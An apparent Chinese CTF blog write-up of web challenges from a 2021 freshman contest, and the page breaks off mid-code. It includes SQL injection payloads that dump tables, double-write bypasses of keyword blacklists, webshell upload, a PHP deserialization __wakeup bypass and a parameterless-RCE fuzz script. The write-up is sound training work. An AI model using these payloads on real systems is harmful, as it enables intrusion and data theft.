<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"mi3aka.eu.org","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="https://mi3aka.eu.org/2021/12/01/2021%E6%96%B0%E7%94%9F%E8%B5%9BWEB-wp/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mi3aka.eu.org/2021/12/01/2021%E6%96%B0%E7%94%9F%E8%B5%9BWEB-wp/","path":"2021/12/01/2021新生赛WEB-wp/","title":"2021新生赛WEB-wp"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2021新生赛WEB-wp | Misaka's Blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Misaka's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-首页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-关于"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-安全"><a href="https://github.com/mi3aka/huaQ" rel="noopener" target="_blank"><i class="fas fa-shield-alt fa-fw fa-fw"></i>安全</a></li><li class="menu-item menu-item-工具"><a href="https://tools.mi3aka.eu.org/" rel="noopener" target="_blank"><i class="fas fa-tools fa-fw"></i>工具</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">初赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-sql"><span class="nav-number">1.1.</span> <span class="nav-text">baby-sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-js"><span class="nav-number">1.2.</span> <span class="nav-text">easy_js</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-upload"><span class="nav-number">1.3.</span> <span class="nav-text">baby-upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-upload"><span class="nav-number">1.4.</span> <span class="nav-text">easy-upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checkin"><span class="nav-number">1.5.</span> <span class="nav-text">checkin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-sql"><span class="nav-number">1.6.</span> <span class="nav-text">easy-sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-unserialize"><span class="nav-number">1.7.</span> <span class="nav-text">baby-unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-rce"><span class="nav-number">1.8.</span> <span class="nav-text">ez-rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPy"><span class="nav-number">1.9.</span> <span class="nav-text">ezPy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp"><span class="nav-number">1.10.</span> <span class="nav-text">thinkphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-unserialize"><span class="nav-number">1.11.</span> <span class="nav-text">easy-unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-php"><span class="nav-number">1.12.</span> <span class="nav-text">simple-php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PictureGenerator"><span class="nav-number">1.13.</span> <span class="nav-text">PictureGenerator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezpop"><span class="nav-number">1.14.</span> <span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#imgbed"><span class="nav-number">1.15.</span> <span class="nav-text">imgbed</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%B3%E8%B5%9B"><span class="nav-number">2.</span> <span class="nav-text">决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-sql"><span class="nav-number">2.1.</span> <span class="nav-text">medium-sql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.1.1.</span> <span class="nav-text">源码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87waf"><span class="nav-number">2.1.2.</span> <span class="nav-text">绕过waf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2medium%E4%B8%8B%E7%9A%84%E8%A1%A8"><span class="nav-number">2.1.3.</span> <span class="nav-text">查询medium下的表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2c1c7fbbb74d0d43101a2814ade767362"><span class="nav-number">2.1.4.</span> <span class="nav-text">查询c1c7fbbb74d0d43101a2814ade767362</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-unserialize"><span class="nav-number">2.2.</span> <span class="nav-text">medium-unserialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.1.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E5%88%B6gc"><span class="nav-number">2.2.2.</span> <span class="nav-text">强制gc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E7%AD%BE%E5%90%8D%E7%AF%A1%E6%94%B9"><span class="nav-number">2.2.3.</span> <span class="nav-text">phar签名篡改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E5%8E%8B%E7%BC%A9%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95-file-put-contents%E6%95%B0%E7%BB%84%E4%BC%A0%E5%8F%82"><span class="nav-number">2.2.4.</span> <span class="nav-text">phar压缩绕过黑名单&#x2F;file_put_contents数组传参</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0pop%E9%93%BE"><span class="nav-number">2.2.5.</span> <span class="nav-text">构造pop链</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Misaka</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">39</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://akarin.dev/" title="https:&#x2F;&#x2F;akarin.dev" rel="noopener" target="_blank">存在感消失的地方|ω•`)</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://passbya.xyz/" title="https:&#x2F;&#x2F;passbya.xyz&#x2F;" rel="noopener" target="_blank">PassbyAの阿瓦隆</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://tearsjin.github.io/" title="https:&#x2F;&#x2F;tearsjin.github.io&#x2F;" rel="noopener" target="_blank">K1rit0</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://hengy1.top/" title="https:&#x2F;&#x2F;hengy1.top&#x2F;" rel="noopener" target="_blank">恒HengY1毅</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/mi3aka" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://mi3aka.eu.org/2021/12/01/2021%E6%96%B0%E7%94%9F%E8%B5%9BWEB-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Misaka">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Misaka's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="2021新生赛WEB-wp | Misaka's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2021新生赛WEB-wp
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-01 08:08:08" itemprop="dateCreated datePublished" datetime="2021-12-01T08:08:08+08:00">2021-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-07-01 16:34:58" itemprop="dateModified" datetime="2022-07-01T16:34:58+08:00">2022-07-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby-sql"></a>baby-sql</h2><span id="more"></span>

<p>传入 <code>admin</code> <code>admin&#39;</code> 报错,猜测闭合方式为<code>&#39;</code></p>
<p>传入 <code>1&#39; or 1=1 order by 1#</code> <code>1</code> 正常回显</p>
<p>传入 <code>1&#39; or 1=1 order by 2#</code> <code>1</code> 正常回显</p>
<p>传入 <code>1&#39; or 1=1 order by 3#</code> <code>1</code> 正常回显</p>
<p>传入 <code>1&#39; or 1=1 order by 4#</code> <code>1</code> 报错,可知一共三列</p>
<p>传入 <code>1&#39; and 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code> <code>1</code> 得知共有两个table分别为<code>flag</code>和<code>users</code></p>
<p>传入 <code>1&#39; and 1=1 union select 1,2,group_concat(flag) from flag#</code> <code>1</code> getflag</p>
<h2 id="easy-js"><a href="#easy-js" class="headerlink" title="easy_js"></a>easy_js</h2><p>将<code>index.js</code>中的内容丢到<a target="_blank" rel="noopener" href="https://www.sojson.com/jsjiemi.html">https://www.sojson.com/jsjiemi.html</a>中进行解密</p>
<p>关键函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">c</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable constant_">H1</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">window</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&quot;clickNumber&quot;</span>)[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&quot;Click number: &quot;</span> + <span class="variable constant_">H1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">H1</span> === <span class="number">99999999</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> boF7 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="keyword">var</span> jQs8 = <span class="string">&quot;flaggggggggggggggg.php?c1ick=&quot;</span> + <span class="variable constant_">H1</span>;</span><br><span class="line">        boF7[<span class="string">&#x27;onreadystatechange&#x27;</span>] = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (boF7[<span class="string">&#x27;readyState&#x27;</span>] == <span class="number">4</span> &amp;&amp; boF7[<span class="string">&#x27;status&#x27;</span>] == <span class="number">200</span>) &#123;</span><br><span class="line">                text = boF7[<span class="string">&#x27;responseText&#x27;</span>];</span><br><span class="line">                <span class="variable language_">window</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;flag&#x27;</span>)[<span class="string">&#x27;innerHTML&#x27;</span>] = text;</span><br><span class="line">                <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](text)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        boF7[<span class="string">&#x27;open&#x27;</span>](<span class="string">&quot;GET&quot;</span>, jQs8, <span class="literal">true</span>);</span><br><span class="line">        boF7[<span class="string">&#x27;send&#x27;</span>]()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">window</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;flag&#x27;</span>)[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&quot;flag will appear when you click 99999999 times !&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据js代码提示,访问<a target="_blank" rel="noopener" href="http://35.229.138.83:13251/flaggggggggggggggg.php?c1ick=99999999">http://35.229.138.83:13251/flaggggggggggggggg.php?c1ick=99999999</a>即可getshell</p>
<h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby-upload"></a>baby-upload</h2><p>上传一个<code>xxx.php</code>的webshell即可</p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h2><p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file_ext</span>);</span><br></pre></td></tr></table></figure>

<p>存在黑名单关键字替换,双写绕过即可,假设文件拓展名为<code>pphphp</code>,经过<code>str_ireplace</code>后变为<code>php</code></p>
<p>上传一个<code>xxx.pphphp</code>的webshell即可</p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/checkin-1.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/checkin-2.png"></p>
<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy-sql"></a>easy-sql</h2><p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;select&quot;</span>, <span class="string">&quot;union&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;ro&quot;</span>, <span class="string">&quot;where&quot;</span>);</span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$var</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与<code>easy-upload</code>的过滤方式一样</p>
<p>传入 <code>admin</code> <code>admin&quot;</code> 报错,猜测闭合方式为<code>&quot;</code></p>
<p>传入 <code>1&quot; oorr 1=1 oorrder by 1#</code> <code>1</code> 正常回显</p>
<p>传入 <code>1&quot; oorr 1=1 oorrder by 2#</code> <code>1</code> 正常回显</p>
<p>传入 <code>1&quot; oorr 1=1 oorrder by 3#</code> <code>1</code> 正常回显</p>
<p>传入 <code>1&quot; oorr 1=1 oorrder by 4#</code> <code>1</code> 报错,可知一共三列</p>
<p>传入 <code>1&quot; and 1=1 ununionion seselectlect 1,2,grrooup_concat(table_name) frroom infoorrmation_schema.tables whwhereere table_schema=database()#</code> <code>1</code> 得知共有两个table分别为<code>flag</code>和<code>users</code></p>
<p>传入<code>1&quot; and 1=1 ununionion selselectect 1,2,grrooup_concat(flflagag) frroom flflagag#</code> <code>1</code> getflag</p>
<h2 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby-unserialize"></a>baby-unserialize</h2><p>考点：</p>
<ol>
<li><p>__wakeup绕过</p>
</li>
<li><p>反序列化16进制编码绕过</p>
</li>
</ol>
<p>序列化字符串中的字母含义</p>
<table>
<thead>
<tr>
<th align="center">字母</th>
<th align="center">解释</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">a:array</td>
<td align="center">数组</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">b:boolean</td>
<td align="center">布尔值</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">d:double</td>
<td align="center">浮点数</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">i:integer</td>
<td align="center">整数</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">r:reference</td>
<td align="center">对象引用</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">s:string</td>
<td align="center">字符串</td>
<td align="center"><strong>大写的S(使用转义字符)替换小写的s即可用16进制表示</strong></td>
</tr>
<tr>
<td align="center">O:class</td>
<td align="center">普通类</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">N:null</td>
<td align="center">NULL</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">R:pointer reference</td>
<td align="center">指针引用</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U:unicode string</td>
<td align="center">Unicode字符串</td>
<td align="center"></td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> baby;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;O:4:&quot;baby&quot;:1&#x27;</span>, <span class="string">&#x27;O:4:&quot;baby&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));<span class="comment">//__wakeup绕过</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p><code>O:4:&quot;baby&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<h2 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez-rce"></a>ez-rce</h2><p><a target="_blank" rel="noopener" href="https://github.com/AMDyesIntelno/huaQ/tree/master/PHP%20trick/%E6%97%A0%E5%8F%82%E6%95%B0RCE">无参数RCE</a></p>
<p>fuzz脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#var_dump(get_defined_functions()[&quot;internal&quot;]);</span></span><br><span class="line"><span class="variable">$func</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>]); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>][<span class="variable">$i</span>])) &#123;</span><br><span class="line">        <span class="variable">$func</span>[<span class="variable">$j</span>] = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>][<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$j</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#print_r($func);</span></span><br><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;getenv&#x27;</span>, <span class="string">&#x27;getallheaders&#x27;</span>, <span class="string">&#x27;get_defined_vars&#x27;</span>, <span class="string">&#x27;session_id&#x27;</span>, <span class="string">&#x27;getcwd&#x27;</span>, <span class="string">&#x27;phpversion&#x27;</span>, <span class="string">&#x27;localeconv&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;localtime&#x27;</span>, <span class="string">&#x27;array_rand&#x27;</span>, <span class="string">&#x27;array_flip&#x27;</span>, <span class="string">&#x27;array_reverser&#x27;</span>, <span class="string">&#x27;current&#x27;</span>, <span class="string">&#x27;pos&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;chdir&#x27;</span>, <span class="string">&#x27;scandir&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;str_split&#x27;</span>, <span class="string">&#x27;strval&#x27;</span>, <span class="string">&#x27;fclose&#x27;</span>, <span class="string">&#x27;tmpfile&#x27;</span>, <span class="string">&#x27;file_get_contents&#x27;</span>, <span class="string">&#x27;highlight_file&#x27;</span>, <span class="string">&#x27;show_source&#x27;</span>, <span class="string">&#x27;readfile&#x27;</span>, <span class="string">&#x27;readgzfile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;hebrevc&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;serialize&#x27;</span>, <span class="string">&#x27;array&#x27;</span>];</span><br><span class="line"><span class="comment">#print_r($a);</span></span><br><span 